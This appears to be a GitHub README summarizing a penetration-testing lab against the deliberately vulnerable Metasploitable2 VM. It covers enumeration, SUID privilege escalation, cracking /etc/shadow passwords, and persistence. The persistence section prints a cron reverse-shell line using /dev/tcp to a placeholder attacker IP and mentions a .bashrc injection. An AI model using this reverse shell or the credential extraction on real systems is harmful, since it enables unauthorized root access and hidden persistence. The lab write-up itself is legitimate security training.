# cybersecurity-privilege-escalation
This project covers an end-to-end penetration testing workflow on Metasploitable2, focusing on enumeration, exploitation, privilege escalation, password cracking, and persistence.


Project II – System Enumeration, Privilege Escalation & Persistence

📌 Overview
This project showcases a full penetration testing workflow on **Metasploitable2**, covering **enumeration, exploitation, privilege escalation, password cracking, and persistence**. The exercise demonstrates attacker methodologies and defensive lessons.

---

🛠️ Tools & Technologies
- **Nmap** – Network & Service Enumeration  
- **Searchsploit/Metasploit** – Exploit Discovery  
- **Linux Commands** – User discovery, privilege escalation  
- **John the Ripper** – Password Cracking  
- **Cron Jobs & Bash** – Persistence mechanisms  

---

🔎 Key Activities
1. System Enumeration (Nmap)  
   - Scanned target `192.168.1.26`.  
   - Discovered services: FTP (vsFTPd 2.3.4), SSH, Telnet, HTTP, MySQL, PostgreSQL, VNC, SMB, etc.  

2. User Account Discovery  
   - Extracted accounts (`msfadmin`, `user`, `services`, `nobody`) via `/etc/passwd`.  

3. SUID Binary Discovery  
   - Identified `/usr/lib/apache2/suexec` and `/usr/lib/openssh/ssh-keysign` as privilege escalation candidates.  

4. Privilege Escalation  
   - Exploited misconfigured SUID binary to gain **root access**.  
   - Verified with `whoami` before (msfadmin) → after (root).  

5. Password Cracking  
   - Extracted `/etc/shadow`.  
   - Cracked weak passwords (`batman`, `123456789`, `service`) using *John the Ripper*.  

6. Persistence Mechanism 
   - Added reverse shell payload via **cron job**:  
     ```bash
     @reboot root bash -i >& /dev/tcp/<Kali-IP>/4444 0>&1
     ```  
   - Alternative: Injected payload into `.bashrc`.  

---


---

✅ Key Takeaways
- Enumeration reveals multiple entry points; patch unnecessary services.  
- SUID misconfigurations remain a major root escalation vector.  
- Enforce strong password policies to prevent easy cracking.  
- Persistence detection requires monitoring cron jobs and startup scripts.  
